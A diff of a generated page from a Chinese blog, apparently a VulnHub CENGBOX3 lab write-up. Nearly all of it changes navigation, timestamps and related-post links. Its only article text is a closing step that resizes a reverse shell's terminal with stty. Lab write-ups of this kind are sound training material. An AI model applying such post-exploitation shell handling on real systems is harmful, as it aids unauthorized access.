 <p>根据查到的终端大小设置反弹 shell 的终端的 stty <code>stty rows 25 columns 79</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1190.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1190.png" width="300" alt="Image">
 <p>现在我们所使用的终端就比较工整了，vim 也能全屏使用了</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1191.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1191.png" width="470" alt="Image">
 
       <div class="tags">
           <a href="/tags/VULNHUB-41-50/" rel="tag"><i class="ic i-tag"></i> VULNHUB 41-50</a>
@@ -387,7 +387,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-06 20:32:47" itemprop="dateModified" datetime="2023-07-06T20:32:47+08:00">2023-07-06</time>
+    <time title="修改时间：2023-07-07 12:42:01" itemprop="dateModified" datetime="2023-07-07T12:42:01+08:00">2023-07-07</time>
   </span>
   <span id="2021/11/01/VULNHUB/141 CENGBOX3/" class="item leancloud_visitors" data-flag-title="VULNHUB 41 CENGBOX3" title="阅读次数">
       <span class="icon">
@@ -450,20 +450,20 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
     <div class="item left">
       
 
-  <a href="/2021/11/01/VULNHUB/144%20CEREAL/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;C83rXtNWOS4dPh6.jpg" title="VULNHUB 44 CEREAL">
+  <a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;NAc3EBhzxTbRiuQ.jpg" title="VULNHUB 42 DARKHOLE2">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 44 CEREAL</h3>
+  <h3>VULNHUB 42 DARKHOLE2</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2021/11/01/VULNHUB/140%20LOOZ/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;mg3v58QxFb7tICZ.jpg" title="VULNHUB 40 LOOZ">
+  <a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;nNsjUzcTObfYtMa.jpg" title="VULNHUB 38 BLUESOMKE">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 40 LOOZ</h3>
+  <h3>VULNHUB 38 BLUESOMKE</h3>
   </a>
 
     </div>
@@ -486,7 +486,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li class="active"><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li>
+          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li class="active"><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
@@ -595,12 +595,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -622,20 +622,10 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/1%E3%80%8A%E5%A4%A9%E6%89%8D%E5%9C%A8%E5%B7%A6%EF%BC%8C%E7%96%AF%E5%AD%90%E5%9C%A8%E5%8F%B3%E3%80%8B%E9%AB%98%E9%93%AD/" title="《天才在左，疯子在右》高铭">《天才在左，疯子在右》高铭</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/60%E3%80%8A%E9%87%91%E9%A9%B4%E8%AE%B0%E3%80%8B%E9%98%BF%E6%99%AE%E5%88%97%E4%B9%8C%E6%96%AF/" title="《金驴记》阿普列乌斯">《金驴记》阿普列乌斯</a></span>
+    <span><a href="/2019/07/01/BOOK/57%E3%80%8A%E4%B8%8D%E6%9C%BD%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/" title="《不朽》米兰·昆德拉">《不朽》米兰·昆德拉</a></span>
   </li>
 
       
@@ -645,57 +635,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" title="XD22 13 补充知识">XD22 13 补充知识</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/23%E3%80%8A%E7%8E%B0%E5%AE%9E%E4%B8%80%E7%A7%8D%E3%80%8B%E4%BD%99%E5%8D%8E/" title="《现实一种》余华">《现实一种》余华</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/45%E3%80%8A%E5%B7%B4%E9%BB%8E%E5%9C%A3%E6%AF%8D%E9%99%A2%E3%80%8B%E9%9B%A8%E6%9E%9C/" title="《巴黎圣母院》雨果">《巴黎圣母院》雨果</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/38%E3%80%8A%E5%84%BF%E5%AD%90%E4%B8%8E%E6%83%85%E4%BA%BA%E3%80%8B%E5%8A%B3%E4%BC%A6%E6%96%AF/" title="《儿子与情人》劳伦斯">《儿子与情人》劳伦斯</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/29%E3%80%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%9D%9F%E3%80%8B%E5%88%98%E5%85%B4%E5%A5%87/" title="《大学生的坟》刘兴奇">《大学生的坟》刘兴奇</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/30%E3%80%8A%E4%BA%BA%E7%94%9F%E8%AE%BA%E3%80%8B%E5%BC%97%E6%9C%97%E8%A5%BF%E6%96%AF%C2%B7%E5%9F%B9%E6%A0%B9/" title="《人生论》弗朗西斯·培根">《人生论》弗朗西斯·培根</a></span>
+    <span><a href="/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="XD22 8 代码审计">XD22 8 代码审计</a></span>
   </li>
 
       
@@ -705,7 +645,17 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></span>
+    <span><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/68%E3%80%8A%E7%81%B5%E9%AD%82%E5%8F%AA%E8%83%BD%E7%8B%AC%E8%A1%8C%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/" title="《灵魂只能独行》周国平">《灵魂只能独行》周国平</a></span>
   </li>
 
       
@@ -715,7 +665,57 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2020/04/01/MBTI/MBTI%E4%B8%8E%E5%85%AB%E7%BB%B4/" title="MBTI与八维">MBTI与八维</a></span>
+    <span><a href="/2020/04/01/MBTI/%E7%90%86%E6%83%B3%E5%8F%A6%E4%B8%80%E5%8D%8A/" title="理想另一半">理想另一半</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/48%E3%80%8A%E4%B8%80%E5%8F%A5%E9%A1%B6%E4%B8%80%E4%B8%87%E5%8F%A5%E3%80%8B%E5%88%98%E9%9C%87%E4%BA%91/" title="《一句顶一万句》刘震云">《一句顶一万句》刘震云</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2020/04/01/MBTI/ESFJ%E8%A7%A3%E8%AF%BB/" title="ESFJ解读">ESFJ解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2023/05/10/SAFE/Security%20URL/" title="信息安全 网址">信息安全 网址</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/56%E3%80%8A%E5%8C%85%E6%B3%95%E5%88%A9%E5%A4%AB%E4%BA%BA%E3%80%8B%E7%A6%8F%E6%A5%BC%E6%8B%9C/" title="《包法利夫人》福楼拜">《包法利夫人》福楼拜</a></span>
   </li>
 
   </ul>
